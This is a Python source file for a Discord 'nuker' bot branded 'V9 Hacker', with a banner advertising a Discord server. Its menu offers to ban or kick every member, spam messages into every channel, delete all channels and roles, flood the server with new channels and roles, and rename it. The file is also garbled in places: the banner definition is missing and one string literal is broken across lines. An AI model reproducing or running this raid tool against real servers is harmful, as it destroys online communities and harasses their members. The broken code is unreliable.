import discord
import asyncio
import sys
import os
from pyfiglet import Figlet

RED = "\033[38;2;214;3;3m"
RESET = "\033[0m"

def clear_screen():
    # يناسب لينكس/ريبلت
    os.system('clear')

def print_eyad():
    f = Figlet(font='standard')
    print(f"{RED}{f.renderText('Eyad')}{RESET}")

{RESET}"""

DISCORD_USER = "Discord User:
2ff4"
SERVER_LINK = "Server Link: https://discord.gg/EFNU2npDgs"

def print_banner():
    print(BANNER)
    print(f"{RED}{DISCORD_USER}{RESET}")
    print(f"{RED}{SERVER_LINK}{RESET}")
    print()

def input_red(text):
    print(RED, end="")
    val = input(text)
    print(RESET, end="")
    return val.strip()

class V9HackerBot(discord.Client):
    def __init__(self, guild_id):
        intents = discord.Intents.all()
        super().__init__(intents=intents)
        self.guild_id = guild_id
        self.guild = None

    async def on_ready(self):
        clear_screen()
        print_eyad()
        print_banner()
        print(f"{RED}Bot logged in as {self.user} | Connected to server ID {self.guild_id}{RESET}")
        self.guild = self.get_guild(self.guild_id)
        if not self.guild:
            print(f"{RED}Can't find the guild with ID {self.guild_id}. Exiting...{RESET}")
            await self.close()
            return
        
        while True:
            self.show_menu()
            choice = input_red("Enter your choice: ")
            await self.handle_choice(choice)
            # بعد تنفيذ الأمر نعيد مسح الشاشة ونطبع الشعار والبانر والقائمة من جديد
            clear_screen()
            print_eyad()
            print_banner()
            await asyncio.sleep(0.5)  # تعطيل بسيط للراحة

    def show_menu(self):
        print(f"""
{RED}========= V9 Hacker Menu ========={RESET}
{RED}[1] Ban all members{RESET}
{RED}[2] Kick all members{RESET}
{RED}[3] Server info{RESET}
{RED}[4] Spam messages in all channels{RESET}
{RED}[5] Create text channels{RESET}
{RED}[6] Delete text channels{RESET}
{RED}[7] Create voice channels{RESET}
{RED}[8] Delete voice channels{RESET}
{RED}[9] Create roles{RESET}
{RED}[10] Delete roles{RESET}
{RED}[11] Change server name{RESET}
{RED}[0] Exit{RESET}
""")

    async def handle_choice(self, choice):
        if choice == "1":
            await self.ban_all()
        elif choice == "2":
            await self.kick_all()
        elif choice == "3":
            self.server_info()
        elif choice == "4":
            await self.spam_messages()
        elif choice == "5":
            await self.create_text_channels()
        elif choice == "6":
            await self.delete_text_channels()
        elif choice == "7":
            await self.create_voice_channels()
        elif choice == "8":
            await self.delete_voice_channels()
        elif choice == "9":
            await self.create_roles()
        elif choice == "10":
            await self.delete_roles()
        elif choice == "11":
            await self.change_server_name()
        elif choice == "0":
            print(f"{RED}Exiting... Goodbye!{RESET}")
            await self.close()
            sys.exit()
        else:
            print(f"{RED}Invalid choice! Try again.{RESET}")
        await asyncio.sleep(1)

    async def ban_all(self):
        print(f"{RED}Banning all members...{RESET}")
        for member in self.guild.members:
            if member != self.guild.owner and not member.bot:
                try:
                    await member.ban(reason="V9 Hacker action")
                    print(f"{RED}Banned: {member}{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to ban {member}: {e}{RESET}")
        print(f"{RED}Ban all operation done.{RESET}")

    async def kick_all(self):
        print(f"{RED}Kicking all members...{RESET}")
        for member in self.guild.members:
            if member != self.guild.owner and not member.bot:
                try:
                    await member.kick(reason="V9 Hacker action")
                    print(f"{RED}Kicked: {member}{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to kick {member}: {e}{RESET}")
        print(f"{RED}Kick all operation done.{RESET}")

    def server_info(self):
        created_at = self.guild.created_at.strftime("%Y-%m-%d %H:%M:%S")
        owner = self.guild.owner
        text_channels = len(self.guild.text_channels)
        voice_channels = len(self.guild.voice_channels)
        members = self.guild.member_count
        print(f"""
{RED}Server Name: {self.guild.name}
Created at: {created_at}
Owner: {owner}
Text Channels: {text_channels}
Voice Channels: {voice_channels}
Members: {members}{RESET}
""")

    async def spam_messages(self):
        msg = input_red("Enter the message to spam: ")
        try:
            count = int(input_red("How many messages per channel?: "))
        except ValueError:
            print(f"{RED}Invalid number. Returning to menu.{RESET}")
            return
        print(f"{RED}Spamming {count} messages in all text channels...{RESET}")
        for channel in self.guild.text_channels:
            for _ in range(count):
                try:
                    await channel.send(msg)
                except Exception as e:
                    print(f"{RED}Failed to send message in {channel}: {e}{RESET}")
        print(f"{RED}Spam operation completed.{RESET}")

    async def create_text_channels(self):
        try:
            count = int(input_red("How many text channels to create?: "))
        except ValueError:
            print(f"{RED}Invalid number. Returning to menu.{RESET}")
            return
        print(f"{RED}Creating {count} text channels...{RESET}")
        for i in range(count):
            try:
                await self.guild.create_text_channel(f"v9-text-{i+1}")
                print(f"{RED}Created text channel v9-text-{i+1}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to create text channel: {e}{RESET}")
        print(f"{RED}Text channels creation done.{RESET}")

    async def delete_text_channels(self):
        print(f"{RED}Deleting all text channels...{RESET}")
        for channel in self.guild.text_channels:
            try:
                await channel.delete()
                print(f"{RED}Deleted text channel {channel}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to delete text channel {channel}: {e}{RESET}")
        print(f"{RED}All text channels deleted.{RESET}")

    async def create_voice_channels(self):
        try:
            count = int(input_red("How many voice channels to create?: "))
        except ValueError:
            print(f"{RED}Invalid number. Returning to menu.{RESET}")
            return
        print(f"{RED}Creating {count} voice channels...{RESET}")
        for i in range(count):
            try:
                await self.guild.create_voice_channel(f"v9-voice-{i+1}")
                print(f"{RED}Created voice channel v9-voice-{i+1}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to create voice channel: {e}{RESET}")
        print(f"{RED}Voice channels creation done.{RESET}")

    async def delete_voice_channels(self):
        print(f"{RED}Deleting all voice channels...{RESET}")
        for channel in self.guild.voice_channels:
            try:
                await channel.delete()
                print(f"{RED}Deleted voice channel {channel}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to delete voice channel {channel}: {e}{RESET}")
        print(f"{RED}All voice channels deleted.{RESET}")

    async def create_roles(self):
        try:
            count = int(input_red("How many roles to create?: "))
        except ValueError:
            print(f"{RED}Invalid number. Returning to menu.{RESET}")
            return
        print(f"{RED}Creating {count} roles...{RESET}")
        for i in range(count):
            try:
                await self.guild.create_role(name=f"v9-role-{i+1}")
                print(f"{RED}Created role v9-role-{i+1}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to create role: {e}{RESET}")
        print(f"{RED}Roles creation done.{RESET}")

    async def delete_roles(self):
        print(f"{RED}Deleting all roles...{RESET}")
        for role in self.guild.roles:
            if role.is_default() or role == self.guild.owner:
                continue
            try:
                await role.delete()
                print(f"{RED}Deleted role {role}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to delete role {role}: {e}{RESET}")
        print(f"{RED}All roles deleted.{RESET}")

    async def change_server_name(self):
        new_name = input_red("Enter the new server name: ")
        try:
            await self.guild.edit(name=new_name)
            print(f"{RED}Server name changed to: {new_name}{RESET}")
        except Exception as e:
            print(f"{RED}Failed to change server name: {e}{RESET}")

def main():
    clear_screen()
    print_eyad()
    print_banner()
    token = input_red("Enter your bot token: ")
    guild_id_input = input_red("Enter your server ID: ")
    try:
        guild_id = int(guild_id_input)
    except ValueError:
        print(f"{RED}Invalid server ID! Exiting.{RESET}")
        return

    client = V9HackerBot(guild_id)
    client.run(token)

if __name__ == "__main__":
    main()
